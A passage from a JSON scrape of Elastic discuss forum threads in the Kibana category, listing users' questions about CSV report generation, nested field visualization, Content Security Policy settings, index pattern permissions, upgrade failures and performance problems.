    "category": [
      "Kibana"
    ],
    "author": "pabrolcab",
    "date": "April 17, 2020, 8:37am April 17, 2020, 10:57am",
    "body": "I have a problem with \"Generate CSV\". After saving the search and clicking on \"Share-> CSV Reports -> Generate CSV\", I get the following error: But when trying a second or third time, the CSV is generated correctly. I am using Kibana 7.4.2 and platinum license. Setting in Kibana.yml is: xpack.reporting.enabled: true xpack.reporting.capture.browser.type: \"chromium\" xpack.reporting.encryptionKey: \"sample\" xpack.security.encryptionKey: \"sampleSecurity\" I have several instances of kibana running at the same time and the same settings on all of them. What could be happening? Thanks, Pablo",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "e5efe922-a6ee-495c-beab-31c118f51480",
    "url": "https://discuss.elastic.co/t/kibana-7-3-export-csv-from-discovery-not-exporting-data/228370",
    "title": "Kibana 7.3 - Export CSV from Discovery not exporting data",
    "category": [
      "Kibana"
    ],
    "author": "s-manjunath",
    "date": "April 16, 2020, 4:35pm April 17, 2020, 10:38am April 17, 2020, 10:44am",
    "body": "I am using Kibana 7.3.1 (2) , Whenever I search from the discovery, the search is displayed. However, after saving the search and exporting the results from Share-> CSV Reports -> Generate CSV, the results are not saved in the csv file. only the column names are coming. I am using basic license. And, the following settings in Kibana.yml xpack.reporting.enabled : true I have also tried different configuration settings along with above xpack.reporting.encryptionKey : \"samplekey\" xpack.reporting.kibanaServer.hostname : localhost xpack.reporting.csv.maxSizeBytes : 104857600 xpack.reporting.capture.loadDelay : 30000 I have verified from different answers, but was not of help. what is it that I am missing ? Thanks, Manjunath",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "feacce50-6fc4-4873-9df3-229683191c15",
    "url": "https://discuss.elastic.co/t/unable-to-select-correct-index-in-map-visualisation/228466",
    "title": "Unable to select correct Index in map visualisation",
    "category": [
      "Kibana"
    ],
    "author": "",
    "date": "April 17, 2020, 7:58am April 17, 2020, 8:27am April 17, 2020, 8:41am April 17, 2020, 1:04pm April 17, 2020, 10:43am",
    "body": "",
    "website_area": "discuss",
    "replies": 5
  },
  {
    "id": "da0879ca-172c-42dd-8fb1-46d268c44b7e",
    "url": "https://discuss.elastic.co/t/kibana-plugin-upgrade/228480",
    "title": "Kibana plugin upgrade",
    "category": [
      "Kibana"
    ],
    "author": "nplatis",
    "date": "April 17, 2020, 8:58am April 17, 2020, 10:30am",
    "body": "I had developed a Kibana plugin for Kibana 5.5.2, and now I want to use it in Kibana 7.6. It is a simple application that reads and writes some data from/to the ES \"server\" but it was created as a Kibana plugin because we make use of some visualizations provided. My main question is: can I still use Angular for the plugin, or will I have to use React (therefore I will have to rewrite the UI)? And, if yes, will I still be able to use Angular in Kibana 8? Because I see that several things regarding plugins will change in Kibana 8. Thanks!",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "4cd0e0fb-472a-4a5a-9d77-e5ed064bee0c",
    "url": "https://discuss.elastic.co/t/getting-visualize-not-found-error-in-kibana/227440",
    "title": "Getting Visualize: not found error in kibana",
    "category": [
      "Kibana"
    ],
    "author": "kaviraj",
    "date": "April 10, 2020, 5:47am April 10, 2020, 8:59am April 17, 2020, 4:50am April 17, 2020, 8:58am",
    "body": "Hello Team, kibana version used: 4.5 Elasticsearch version:2.3 Am getting the error as Visualize: not found kibana erro_LI1314×130 34.3 KB",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "7204e4f1-8277-46fe-8a98-704a895c6f8d",
    "url": "https://discuss.elastic.co/t/visualizing-nested-data-type-in-kibana/228247",
    "title": "Visualizing Nested Data Type in Kibana",
    "category": [
      "Kibana"
    ],
    "author": "ferrari",
    "date": "April 16, 2020, 5:36am April 16, 2020, 12:53pm April 17, 2020, 5:59am",
    "body": "Hi All, I am new to Kibana. I have been trying to create dashboards to visualize nested datatype but no luck, even simple stuff like adding field from nested datatype as column in Data Table is not working. Here are my questions - I read few old threads and seems like it's not possible, is that still true with Kibana 7.6.1? What are the alternatives/best practice for such usecase? Here is an example of what I am trying to achieve: Example Index pattern mapping in ES: { \"mappings\": { \"properties\": { \"Employee\": { \"type\": \"nested\", \"properties\" : { \"first\" : { \"type\" : \"text\" }, \"last\" : { \"type\" : \"text\" }, \"salary\" : { \"type\" : \"double\" } }}} }} On such mapping I want to lets say create Data Table in Kibana that shows |FirstName | LastName |Salary | but instead in Kibana I only see nested field as JSON, so I only see Employee as column and first, last and salary are shown only as JSON. I even tried playing around with \"include_in_root\" & \"include_in_parent\" fields in mapping but no luck. Once I get past this the next step would be to get some pie charts etc working on nested fields for aggregation etc kind of operations. Is the best strategy to deal with nested fields to store data in separate index in ES after transforming to allow easy Visualization? Will really appreciate help and guidance! Thanks!",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "1f849a57-630f-4976-b6b2-3da31dda84c3",
    "url": "https://discuss.elastic.co/t/is-unsafe-eval-required-for-script-src-in-the-content-security-policy-for-kibana-6-7-1/226298",
    "title": "Is unsafe-eval required for script-src in the content-security-policy for Kibana 6.7.1?",
    "category": [
      "Kibana"
    ],
    "author": "cjin62",
    "date": "April 3, 2020, 12:36am April 3, 2020, 2:37am April 3, 2020, 5:05am April 6, 2020, 6:31pm April 6, 2020, 6:47pm April 17, 2020, 1:00am",
    "body": "When loading the Kibana dashboard home page, unsafe-eval shows up for script-src: content-security-policy: script-src 'unsafe-eval' 'self' Is unsafe-eval required for Kibana dashboard to work? Or only needed for certain functions in the Kibana dashboard? We have the following menus/functions on the left hand side: Discover Visualize Dashboard Timelion Alerting Dev Tools Management Security Usually, for 'default-src', 'script-src' and 'object-src', unsafe-eval is considered insecure and should be avoided... As banning the ability to execute strings makes it much more difficult for an attacker to execute unauthorized code on the site...",
    "website_area": "discuss",
    "replies": 6
  },
  {
    "id": "8f7b7943-a659-493a-af53-53290af49342",
    "url": "https://discuss.elastic.co/t/elk-problem-with-kibana/228279",
    "title": "ELK, Problem with kibana",
    "category": [
      "Kibana"
    ],
    "author": "ilhem",
    "date": "April 16, 2020, 8:36am April 16, 2020, 8:44am April 16, 2020, 9:30am April 16, 2020, 9:21am April 16, 2020, 9:35am April 16, 2020, 9:36am April 16, 2020, 9:42am April 16, 2020, 9:44am April 16, 2020, 11:12am April 16, 2020, 9:32pm",
    "body": "I started using ELK, I liked it but I have a problem. actually i used logstash to analyze my log files and kibana to visualize it as a curve (a surface curve), it was great but the problem was I want to do my work automatically, I mean I want to find a way to make the kibana curve generated automatically (via a script) without human intervention. Is this possible or I should get away from Kibana.",
    "website_area": "discuss",
    "replies": 10
  },
  {
    "id": "98a77ffd-0f4a-44d5-950c-b6a948620601",
    "url": "https://discuss.elastic.co/t/how-to-compare-data-in-different-sets-of-documents-matched-by-their-timestamp-in-kibana/228166",
    "title": "How to compare data in different sets of documents matched by their timestamp in Kibana",
    "category": [
      "Kibana"
    ],
    "author": "ris",
    "date": "April 15, 2020, 4:05pm April 16, 2020, 12:37pm April 16, 2020, 7:43pm",
    "body": "Hi, I am new to Kibana and elasticsearch and run into a problem with some basic analysis, where I want to compare different sets of documents matched by their timestamp in Kibana The situation is as follows: We are uploading sensor data from different devices and I want to compare data of deviceA with data of deviceB. This means data of both devices should be matched based on timestamp for analysis. Analysis I would like to do with this data: Plot sensordata of deviceA (yaxis) against deviceB (xaxis) (average) difference between deviceA and deviceB etc Documents stored contain a device ID, timestamp and sensordata Is this possible in Kibana? Is there an option to do some custom preprocessing of data in Kibana? Or would I need to add a plugin? Thank you!",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "cd84e77a-63b3-42d9-b54a-55d70bc0d7cc",
    "url": "https://discuss.elastic.co/t/tsvb-creating-variables-for-math/228385",
    "title": "TSVB - Creating variables for Math",
    "category": [
      "Kibana"
    ],
    "author": "adahn",
    "date": "April 16, 2020, 5:35pm April 16, 2020, 7:36pm April 16, 2020, 7:41pm",
    "body": "I'd like to create a TSVB Metric using the Math aggregation. I would like to create two variables using filters, so I know I need to set up those aggregations before the Math module, but I'm having trouble figuring out how. Basically I want to create: Variable A - Count of documents matching one query Variable B - Count of documents matching a different query Use Math aggregation to work on those variables and output a single number displayed as Metric",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "519e593a-8ae6-447f-87e8-9c9a32934112",
    "url": "https://discuss.elastic.co/t/feed-custom-label-latlong-to-maps/228309",
    "title": "Feed custom label latlong to maps",
    "category": [
      "Kibana"
    ],
    "author": "Manish_Saraf",
    "date": "April 16, 2020, 11:52am April 16, 2020, 12:58pm April 16, 2020, 2:55pm April 16, 2020, 3:32pm",
    "body": "we want to use APM RUM feeds to reflect users on teh maps for an application. Does kibana support only geo tags or we can use the custom tags",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "882cf9fc-b711-4de3-a0ff-884088788696",
    "url": "https://discuss.elastic.co/t/problem-with-kibana-unable-to-load-dashboards/228325",
    "title": "Problem with Kibana unable to load Dashboards",
    "category": [
      "Kibana"
    ],
    "author": "Chandrashekar467",
    "date": "April 16, 2020, 1:23pm April 16, 2020, 3:17pm",
    "body": "Hi all, I have installed metric-beat , but unable to load he kibana dashboard for mongodb. i am getting below error, [10.0.1.1:9300][indices:data/read/search[phase/query]] Caused by: java.lang.IllegalArgumentException: Fielddata is disabled on text fields by default. Set fielddata=true on [service.address] in order to load fielddata in memory by uninverting the inverted index. Note that this can however use significant memory. Alternatively use a keyword field instead. at org.elasticsearch.index.mapper.TextFieldMapper$TextFieldType.fielddataBuilder(TextFieldMapper.java:759) ~[elasticsearch-7.5.0.jar:7.5.0]",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "fdaac29a-ab4b-4bcb-841e-cbe3eba10241",
    "url": "https://discuss.elastic.co/t/kibana-server-not-ready-yet-update-from-7-5-2-to-7-6-2/228100",
    "title": "KIbana server not ready yet. Update from 7.5.2 to 7.6.2",
    "category": [
      "Kibana"
    ],
    "author": "MichaelA",
    "date": "April 15, 2020, 11:30am April 15, 2020, 12:25pm April 15, 2020, 12:34pm April 15, 2020, 12:55pm April 15, 2020, 12:56pm April 15, 2020, 1:04pm April 15, 2020, 1:42pm April 15, 2020, 3:13pm April 15, 2020, 3:19pm April 16, 2020, 8:24am April 16, 2020, 10:45am April 16, 2020, 11:17am April 16, 2020, 11:34am April 16, 2020, 12:15pm April 16, 2020, 12:25pm April 16, 2020, 1:53pm April 16, 2020, 4:05pm",
    "body": "Hi, dear community! I updated Kibana and Elasticsearch from version 7.5.2 to 7.6.2 and received an error - KIbana server not ready yet. I do not see anything suspicious in the logs except that the Kibana service is restarted every four minutes by unknown reason. I will very appreciate some help, thank you. kibana log - https://pastebin.com/meBySpE9 elastic log - https://pastebin.com/vrRkVf92 netstat, nodes and cluster health screenshot: https://imgur.com/a/JdzGaX7",
    "website_area": "discuss",
    "replies": 17
  },
  {
    "id": "96b419f9-40ab-452b-aab1-388916218096",
    "url": "https://discuss.elastic.co/t/kibana-warning-on-control-visualization-terms-list-might-be-incomplete/228338",
    "title": "Kibana warning on control visualization: \"Terms list might be incomplete ...\"",
    "category": [
      "Kibana"
    ],
    "author": "tomj",
    "date": "April 16, 2020, 2:21pm April 16, 2020, 2:29pm April 16, 2020, 2:50pm",
    "body": "Using Elastic Cloud with 7.6.2 and Kibana 7.6.2. When opening any control visualization or a dashboard which uses the control visualization, I get the warning below. The example cited here has exactly two terms, not dozens or hundreds. The control renders fast enough, so I don't know what request is \"taking too long\". When I look at the two autocomplete timeout settings (as documented) they both seem quite reasonable. Is there perhaps another underlying cause? Screenshot from 2020-04-15 12-29-321778×872 76.9 KB",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "0cedb668-71ac-4c7f-8c1b-8275289b0791",
    "url": "https://discuss.elastic.co/t/kibana-7-4-2-is-taking-too-much-time-to-load/226539",
    "title": "Kibana 7.4.2 is taking too much time to load",
    "category": [
      "Kibana"
    ],
    "author": "ravi_yadav2",
    "date": "April 4, 2020, 9:11pm April 16, 2020, 6:12am April 9, 2020, 7:31pm April 16, 2020, 9:47am April 16, 2020, 2:49pm",
    "body": "Hi Team, In am using kibana 7.4.2 , It is taking too much time to load around 10 seconds. There are few modules which are not needed in my use case like APM, timelion, SIEM. how can i remove these modules at code level so that kibana startup time get reduced. Please help team !",
    "website_area": "discuss",
    "replies": 5
  },
  {
    "id": "6474eca3-8d93-42ae-92f2-f96604c01a0f",
    "url": "https://discuss.elastic.co/t/dark-theme-by-default/228326",
    "title": "Dark theme by default",
    "category": [
      "Kibana"
    ],
    "author": "centurus",
    "date": "April 16, 2020, 1:25pm April 16, 2020, 2:03pm",
    "body": "Hello. Is it possible to set dark theme as default for all users?",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "5cdea185-07d1-43c0-a09e-3f0a6d15d1fd",
    "url": "https://discuss.elastic.co/t/kibana-7-2-0-index-patterns-are-visible-to-all-users/228323",
    "title": "Kibana 7.2.0 Index Patterns are visible to all users",
    "category": [
      "Kibana"
    ],
    "author": "Piotr_Kacperczyk",
    "date": "April 16, 2020, 1:16pm April 16, 2020, 1:25pm April 16, 2020, 1:33pm April 16, 2020, 2:00pm",
    "body": "Hi, I have installed Kibana 7.2.0 with X-Pack. I created 2 indexes, e.g logging-a-16.04.2020, logging-b-16.04.2020 with index patterns logging-a*, logging-b* I created role 'a' which can access index pattern logging-a* with following privileges monitor,read,create,write,create_index,index,view_index_metadata I created an user and assinged it roles a, kibana_user. When I tried to log in with this user, the user can see the index pattern logging-b* also, eventhough role a has no access to indexpattern logging-b*. Not only that, user is also able to delete the indexpattern logging-b* using Management tab of Kibana. Ofcourse user is not able to see any data from logging-b* index, but he can delete it and when i tried to login in with the user who has access to logging-b* index, i can see that, the index pattern was deleted. I have an usecase where i need to create users based on index patters. I might probably have 20 index patterns and each index pattern will have some users. I dont want all these index patterns to be displayed for all users. Is it possible to do that? Thanks in Advance.",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "14bf865f-bc09-4e0f-90b3-2dba19abe243",
    "url": "https://discuss.elastic.co/t/data-lost-in-kibana-when-either-logstash-or-elasticsearch-servers-are-down/228277",
    "title": "Data lost in kibana when either logstash or elasticsearch servers are down",
    "category": [
      "Kibana"
    ],
    "author": "Alex123",
    "date": "April 16, 2020, 8:24am April 16, 2020, 1:01pm",
    "body": "Data gets lost when either logstash/elasticsearch server is down.. and data gets picked up when one of the both servers are restarted again.. Is there any way to recover/stop the data to be lost. Or search anything else for this issue ?",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "798ce20e-c100-4586-b51a-b0f36d315b81",
    "url": "https://discuss.elastic.co/t/create-line-chart-with-date/228269",
    "title": "Create line chart with date",
    "category": [
      "Kibana"
    ],
    "author": "DG13",
    "date": "April 16, 2020, 7:59am April 16, 2020, 12:59pm",
    "body": "Hi , I have timestamp field coming in data however would like to have one of the chart as line chart with date instead of date . I tried truncating the timestamp to date but the chart is showing a straight line instead of showing the correct count . FYI : Would like to create chart with Date and count data . Thanks, Divya",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "eec47ebd-25e6-4316-a04f-e3dcfdda1232",
    "url": "https://discuss.elastic.co/t/nested-discover-fields-display-as-hyphen-dashpayments-payer-payeridentification-name/228191",
    "title": "Nested Discover Fields Display as Hyphen/Dashpayments.payer.payerIdentification.name",
    "category": [
      "Kibana"
    ],
    "author": "valentim",
    "date": "April 15, 2020, 8:41pm April 15, 2020, 10:37pm April 16, 2020, 1:53pm",
    "body": "In Kibana 7.6.2 discover tab, I have an index that displays all json nested field data as a hyphen/dash. However, I'm expecting data to display. Here's an example of one field: payments.payer.payerIdentification.name payments.payer.payerIdentification.name.keyword image1023×184 3.86 KB If I drill into the row (or view data in _source) the json data exists. Simplified json example: { \"_index\": \"payment\", \"_type\": \"_doc\", \"_id\": \"wOFdXHEB3lhSxZ8rk2wc\", \"_version\": 1, \"_score\": 0, \"_source\": { ... \"payments\": [{ \"payer\": { \"payerIdentification\": { \"name\": \"abc\" } } }] } } Index auto mapping creates the following mapping (for the field): { \"mapping\": { \"_doc\": { \"properties\": { \"payments\": { \"properties\": { ... \"payer\": { \"properties\": { \"payerIdentification\": { \"properties\": { \"name\": { \"type\": \"text\", \"fields\": { \"keyword\": { \"type\": \"keyword\", \"ignore_above\": 256 } } } } } } } } } } } } } I can \"search\" and \"filter\" on this field successfully (so the field does have data): e.g. payments.payer.payerIdentification.name: \"abc\" I can add the payments (top level property) to discover and it displays json data correctly. image1176×141 7.62 KB The Elasticsearch index was created using the \"Elasticsearch for Apache Hadoop\" library with default settings: https://www.elastic.co/guide/en/elasticsearch/hadoop/current/reference.html The source Spark dataframe structure looks good (for the field): root |-- id: string (nullable = true) |-- ... |-- payments: array (nullable = true) | |-- element: struct (containsNull = true) | | |-- payer: struct (nullable = true) | | | |-- payerIdentification: struct (nullable = true) | | | | |-- name: string (nullable = true) In comparison, there is another similar Elasticsearch index (created by another developer) that works as expected. I don't know how the data was loaded. But the mapping and index patterns are the same. The only differences I notice when working with the index: a. All fields are displayed in Discover > Available Fields. In the problem index above, only top level fields display in available fields e.g. payment. Note, I can turn off \"hide missing fields\" and see more fields including payments.payer.payerIdentification.name. b. When viewing the _source field, all fields display as top level fields e.g. payments.payer.payerIdentification.name exists as a top level field. In the problem index above, only the \"payments\" field shows top level (but drilling into payments does show all the correct json data). c. The good index \"health\" displays as green while the problem index above shows as \"yellow. If I had to guess, I'd guess the good index added two different fields to _source (payments and payments.payer.payerIdentification.name) which is why both fields appear at the top level. Additional Update I tried changing the Spark dataframe to include a top level field \"payments.payer.payerIdentification.name\" and removed the \"payments\" field (i.e. chunk of nested json). This new field does behave as expected and shows in Discover > Available fields and the correct data when added to the grid. Spark dataframe structure : root |-- id: string (nullable = true) |-- ... |-- payments.payer.payerIdentification.name: array (nullable = true) | |-- element: string (containsNull = true) However, it's not clear if this is the correct approach. It's a lot more work to parse out each field from nested json (prior to import into Elasticsearch). I would have thought there was a way of getting this correct behavior by importing only one deeply nested json field and using mappings somehow. Thanks!",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "d7f2c22a-e22b-4084-b6d7-033421c36ce5",
    "url": "https://discuss.elastic.co/t/kibana-pod-going-into-crashloopbackoff/228214",
    "title": "Kibana Pod going into CrashLoopBackOff",
    "category": [
      "Kibana"
    ],
    "author": "ntsh999",
    "date": "April 15, 2020, 10:09pm April 16, 2020, 12:50pm",
    "body": "I am running Elastic stack v7.2 on Kubernetes, my ES cluster is in RED state. As a reason my Kibana application never comes up as the Kibana pod is down with the error CrashLoopBackOff. Kibana pod shows the following error log : {\"type\":\"log\",\"@timestamp\":\"2020-04-15T21:50:28Z\",\"tags\":[\"fatal\",\"root\"],\"pid\":1,\"message\":\"{ Error: [search_phase_execution_exception] all shards failed\\n at respond (/usr/share/kibana/node_modules/elasticsearch/src/lib/transport.js:315:15)\\n at checkRespForFailure (/usr/share/kibana/node_modules/elasticsearch/src/lib/transport.js:274:7)\\n at HttpConnector.<anonymous> (/usr/share/kibana/node_modules/elasticsearch/src/lib/connectors/http.js:166:7)\\n at IncomingMessage.wrapper (/usr/share/kibana/node_modules/elasticsearch/node_modules/lodash/lodash.js:4935:19)\\n at IncomingMessage.emit (events.js:194:15)\\n at endReadableNT (_stream_readable.js:1103:12)\\n at process._tickCallback (internal/process/next_tick.js:63:19)\\n status: 503,\\n displayName: 'ServiceUnavailable',\\n message: '[search_phase_execution_exception] all shards failed',\\n path: '/.kibana/_count',\\n query: {},\\n body:\\n { error:\\n { root_cause: [],\\n type: 'search_phase_execution_exception',\\n reason: 'all shards failed',\\n phase: 'query',\\n grouped: true,\\n failed_shards: [] },\\n status: 503 },\\n statusCode: 503,\\n response:\\n '{\\\"error\\\":{\\\"root_cause\\\":[],\\\"type\\\":\\\"search_phase_execution_exception\\\",\\\"reason\\\":\\\"all shards failed\\\",\\\"phase\\\":\\\"query\\\",\\\"grouped\\\":true,\\\"failed_shards\\\":[]},\\\"status\\\":503}',\\n toString: [Function],\\n toJSON: [Function] }\"} FATAL [search_phase_execution_exception] all shards failed :: {\"path\":\"/.kibana/_count\",\"query\":{},\"body\":\"{\\\"query\\\":{\\\"bool\\\":{\\\"should\\\":[{\\\"bool\\\":{\\\"must\\\":[{\\\"exists\\\":{\\\"field\\\":\\\"index-pattern\\\"}},{\\\"bool\\\":{\\\"must_not\\\":{\\\"term\\\":{\\\"migrationVersion.index-pattern\\\":\\\"6.5.0\\\"}}}}]}},{\\\"bool\\\":{\\\"must\\\":[{\\\"exists\\\":{\\\"field\\\":\\\"visualization\\\"}},{\\\"bool\\\":{\\\"must_not\\\":{\\\"term\\\":{\\\"migrationVersion.visualization\\\":\\\"7.2.0\\\"}}}}]}},{\\\"bool\\\":{\\\"must\\\":[{\\\"exists\\\":{\\\"field\\\":\\\"dashboard\\\"}},{\\\"bool\\\":{\\\"must_not\\\":{\\\"term\\\":{\\\"migrationVersion.dashboard\\\":\\\"7.0.0\\\"}}}}]}},{\\\"bool\\\":{\\\"must\\\":[{\\\"exists\\\":{\\\"field\\\":\\\"search\\\"}},{\\\"bool\\\":{\\\"must_not\\\":{\\\"term\\\":{\\\"migrationVersion.search\\\":\\\"7.0.0\\\"}}}}]}}]}}}\",\"statusCode\":503,\"response\":\"{\\\"error\\\":{\\\"root_cause\\\":[],\\\"type\\\":\\\"search_phase_execution_exception\\\",\\\"reason\\\":\\\"all shards failed\\\",\\\"phase\\\":\\\"query\\\",\\\"grouped\\\":true,\\\"failed_shards\\\":[]},\\\"status\\\":503}\"} As I am running this on Kubernetes which adds another layer of abstraction how am I supposed to troubleshoot this without kibana? Below are the last log from the data node- {\"type\": \"server\", \"timestamp\": \"2020-04-15T21:50:28,854+0000\", \"level\": \"DEBUG\", \"component\": \"o.e.a.s.TransportSearchAction\", \"cluster.name\": \"es-eic-logs\", \"node.name\": \"elasticsearch-data-0\", \"cluster.uuid\": \"uAR2d-NXS6i95ZCxxA6m1A\", \"node.id\": \"v38AMmu3TSaZhm3JbzE-Jg\", \"message\": \"All shards failed for phase: [query]\" } {\"type\": \"server\", \"timestamp\": \"2020-04-15T21:50:28,854+0000\", \"level\": \"WARN\", \"component\": \"r.suppressed\", \"cluster.name\": \"es-eic-logs\", \"node.name\": \"elasticsearch-data-0\", \"cluster.uuid\": \"uAR2d-NXS6i95ZCxxA6m1A\", \"node.id\": \"v38AMmu3TSaZhm3JbzE-Jg\", \"message\": \"path: /.kibana/_count, params: {index=.kibana}\" , \"stacktrace\": [\"org.elasticsearch.action.search.SearchPhaseExecutionException: all shards failed\", \"at org.elasticsearch.action.search.AbstractSearchAsyncAction.onPhaseFailure(AbstractSearchAsyncAction.java:296) [elasticsearch-7.2.0.jar:7.2.0]\", \"at org.elasticsearch.action.search.AbstractSearchAsyncAction.executeNextPhase(AbstractSearchAsyncAction.java:139) [elasticsearch-7.2.0.jar:7.2.0]\", \"at org.elasticsearch.action.search.AbstractSearchAsyncAction.onPhaseDone(AbstractSearchAsyncAction.java:259) [elasticsearch-7.2.0.jar:7.2.0]\", \"at org.elasticsearch.action.search.InitialSearchPhase.onShardFailure(InitialSearchPhase.java:105) [elasticsearch-7.2.0.jar:7.2.0]\", \"at org.elasticsearch.action.search.InitialSearchPhase.lambda$performPhaseOnShard$1(InitialSearchPhase.java:251) [elasticsearch-7.2.0.jar:7.2.0]\", \"at org.elasticsearch.action.search.InitialSearchPhase$1.doRun(InitialSearchPhase.java:172) [elasticsearch-7.2.0.jar:7.2.0]\", \"at org.elasticsearch.common.util.concurrent.AbstractRunnable.run(AbstractRunnable.java:37) [elasticsearch-7.2.0.jar:7.2.0]\", \"at org.elasticsearch.common.util.concurrent.TimedRunnable.doRun(TimedRunnable.java:44) [elasticsearch-7.2.0.jar:7.2.0]\", \"at org.elasticsearch.common.util.concurrent.ThreadContext$ContextPreservingAbstractRunnable.doRun(ThreadContext.java:758) [elasticsearch-7.2.0.jar:7.2.0]\", \"at org.elasticsearch.common.util.concurrent.AbstractRunnable.run(AbstractRunnable.java:37) [elasticsearch-7.2.0.jar:7.2.0]\", \"at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1128) [?:?]\", \"at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:628) [?:?]\", \"at java.lang.Thread.run(Thread.java:835) [?:?]\"] } Right now I am not indexing any new data into the ES Cluster, I just want it to be in GREEN so that I can start indexing again. Any pointers on how troubleshoot and fix this issue?",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "dd4dcfcc-e4c1-4d45-b719-f2d5a3e796a3",
    "url": "https://discuss.elastic.co/t/calculating-percentage-and-alerting-through-email/227664",
    "title": "Calculating percentage and alerting through email",
    "category": [
      "Kibana"
    ],
    "author": "rcganesh",
    "date": "April 12, 2020, 10:15am April 14, 2020, 10:34pm April 16, 2020, 10:51am",
    "body": "Hello, I need some inputs on how to achieve below points through Kibana. We are injecting data into Elasticsearch from MQ application. One of the fields in thedata is \"Status\". This field can be either \"SUCCESS\" or \"FAIL\". In Kiban, I can easily create a graph based on COUNT, say count of \"SUCCESS\" in last 10 minutes, count of \"FAIL\" in last 1 hour or total count in last 24 hours. What I am looking for is, How can I show in a graph the percentage of \"SUCCESS\" and \"FAIL\" for the last 5 minutes or a day? Is there any possible way to send an email notification when percentage of \"SUCCESS\" or \"FAIL\" is above 50 for, say, last 15 minutes? Any help or inputs in this regard is really appreciated. Thank you. Ravi Chandran.",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "082363b3-50de-4ca5-9a50-1a6a1f9c7ce8",
    "url": "https://discuss.elastic.co/t/reponse-from-kibana-7-6-0-ui-is-very-slow-in-firefox-web-browser/227680",
    "title": "Reponse from Kibana 7.6.0 UI is very slow in Firefox Web Browser",
    "category": [
      "Kibana"
    ],
    "author": "vasek",
    "date": "April 12, 2020, 3:02pm April 13, 2020, 2:26pm April 13, 2020, 9:15pm April 16, 2020, 6:48am April 16, 2020, 6:53am April 16, 2020, 8:36am",
    "body": "Hello, I am working with 6.3.2 Elastic stack components. I created new Log Management based on Elastic Stack 7.6.0 and Kibana is very slow with comparison 6.3.2 version. Server settings On ES nodes isn't any load. Data takes up several MB. On server where Kibana is running is installed dedicated ES master node. There are 4 cores and 10 GB RAM on this server. When all services running there is still 5 GB of memory free and CPU is almost idle. Web browsers I found out that Kibana UI response is very slow only on Firefox Web browser. I am using 74.0 (64-bit) on Fedora 30. Binary was downloaded from official repository of Firefox. In Google Chrome Version 80.0.3987.149 (Official Build) (64-bit) I haven't so problem like in Firefox but it is still very slow in comparison with Kibana v. 6.3.2. What is slow? All interactions with Kibana UI. Moving some visualizations is extremely slow and I have to wait e.g. 5 - 8 seconds when UI started to react for moving some elements in dashboard. Switching between tabs (Discover, Visualization, Dashboard, etc.) takes 5 - 10 seconds. Do you have any tips how to resolve this?",
    "website_area": "discuss",
    "replies": 6
  },
  {
    "id": "dc5791cb-45d6-4fc7-bae0-7c0312853ab9",
    "url": "https://discuss.elastic.co/t/hide-legends-in-vertical-bar-chart-in-kibana-7-4-2/227843",
    "title": "Hide legends in vertical bar chart in Kibana 7.4.2",
    "category": [
      "Kibana"
    ],
    "author": "RAM_NATHAN",
    "date": "April 14, 2020, 3:23am April 14, 2020, 4:34am April 15, 2020, 11:26am April 15, 2020, 7:47pm April 16, 2020, 7:54am April 16, 2020, 7:54am",
    "body": "I wish to hide the legend in vertical bar chart. It looks odd if number of entries goes beyond 10/15 in x axis Capture1362×508 17.3 KB Can someone please help",
    "website_area": "discuss",
    "replies": 6
  },
  {
    "id": "b048d2b3-28cd-4af1-879a-a283cdea4c35",
    "url": "https://discuss.elastic.co/t/visualizations-broken-for-metricbeat-rds/226752",
    "title": "Visualizations broken for metricbeat rds",
    "category": [
      "Kibana"
    ],
    "author": "zozo6015",
    "date": "April 6, 2020, 5:38pm April 13, 2020, 10:46pm April 13, 2020, 11:00pm April 15, 2020, 5:31am April 15, 2020, 7:49pm April 16, 2020, 7:04am",
    "body": "Hello, I just setup a way to import data from aws rds in elasticsearch so that I can get some nice dashboards but the visualisations are completely broken. I had to edit most of te visualizations and add the fields which I thought that should be there to make them work.",
    "website_area": "discuss",
    "replies": 6
  },
  {
    "id": "1b09a10b-8a58-41d9-b9e0-0861d32d6e25",
    "url": "https://discuss.elastic.co/t/warning-savedobjects-service-unable-to-connect-to-elasticsearch-error-request-timeout-after-30000ms/228029",
    "title": "Warning savedobjects-service Unable to connect to Elasticsearch Error Request Timeout after 30000ms",
    "category": [
      "Kibana"
    ],
    "author": "vivek898",
    "date": "April 15, 2020, 4:28am April 15, 2020, 4:31am April 15, 2020, 2:23pm April 15, 2020, 4:45pm April 16, 2020, 3:59am",
